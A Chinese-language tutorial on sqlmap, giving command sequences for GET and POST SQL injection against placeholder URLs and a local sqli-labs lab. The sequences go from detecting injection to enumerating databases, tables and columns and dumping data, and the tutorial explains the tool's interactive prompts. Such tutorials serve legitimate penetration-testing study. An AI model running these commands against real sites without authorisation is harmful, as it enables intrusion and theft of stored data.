# SQLMap 使用

# SQLMap 使用

## GET型注入

### 1、判断是否存在注入

假设目标注入点是 `http://xxxxxxx?id=1`，判断其是否存在注入的命令如下：

```
sqlmap.py -u http://xxxxxxx?id=1
```

当注入点后面的参数大于等于两个时,需要加双引号，如下所示。

```
sqlmap.py -u "http://xxxxxxx?id=1&uid=2"
```

​	

### 2、爆出服务器的所有数据库名

```
sqlmap.py -u "http://xxxxxxx?id=1" --dbs
```

​	

### 3、爆出当前网站的数据库名

```
sqlmap -u "http://xxxxxxx?id=1" --current-db
```

​	

### 4、爆出表名

```
sqlmap.py -u "http://xxxxxxx?id=1" -D 库名 --tables
```

​	

### 5、爆出字段名(列名)

```
sqlmap.py -u "http://xxxxxxx?id=1" -D 库名 -T 表名 --columns
```

​	

### 6、爆出数据

```
sqlmap.py -u "http://xxxxxxx?id=1" -D 库名 -T 表名 -C 字段1,字段2 --dump
```

​	

​	

## POST型注入

### 注入方式一：BurpSuite抓包

**BurpSuite抓请求包、复制内容保存到txt文件**

### 1、判断是否存在注入

```
sqlmap.py -r D:\1.txt
```

​	

### 2、爆出服务器的所有数据库名

```
sqlmap.py -r D:\1.txt --dbs
```

- **it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]**
  它看起来像后端DBMS是'MySQL'。 是否要跳过特定于其他DBMS的测试负载？ [Y/n] 
  输入"Y"
- **for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]**
  对于剩余的测试，您想要包括所有针对“MySQL”扩展提供的级别（1）和风险（1）值的测试吗？ [Y/n] 
  输入"N"
- **POST parameter 'n' is vulnerable. Do you want to keep testing the others (if any)? [y/N]**
  POST参数'n'是脆弱的。 你想继续测试其他人（如果有的话）吗？[y/N] 
  输入"Y"

​	

### 3、爆出当前网站的数据库名

```
sqlmap.py -r D:\1.txt --current-db
```

​	

### 4、爆出表名

```
sqlmap.py -r D:\1.txt -D 库名 --tables
```

​	

### 5、爆出字段名(列名)

```
sqlmap.py -r D:\1.txt -D 库名 -T 表名 --columns
```

​	

### 6、爆出数据

```
sqlmap.py -r D:\1.txt -D 库名 -T 表名 -C 字段1,字段2 --dump
```

​	

> POST型注入也可以用 `-p` 来指定某个参数

​		

### 注入方式二：自动搜索表单

```
sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/ --forms --level=5 --dbs
```

- do you want to test this form? [Y/n/q]
  要测试此表单吗?[Y/n/q] 
  输入"Y"
- do you want to fill blank fields with random values? [Y/n]
  是否要填充带有随机值的空白字段? [Y/n] 
  输入"Y"
- it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
  它看起来像后端DBMS是'MySQL'。 是否要跳过特定于其他DBMS的测试负载？ [Y/n] 
  输入"Y"
- for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]
  对于剩余的测试，您想要包括所有针对“MySQL”扩展提供的级别（1）和风险（1）值的测试吗？[Y/n] 
  输入"N"
- POST parameter 'n' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
  POST参数'n'是脆弱的。 你想继续测试其他人（如果有的话）吗？[y/N] 
  输入"N"
- do you want to exploit this SQL injection? [Y/n]
  你想利用[SQL注入](https://so.csdn.net/so/search?q=SQL注入&spm=1001.2101.3001.7020)？ 
  输入"Y"
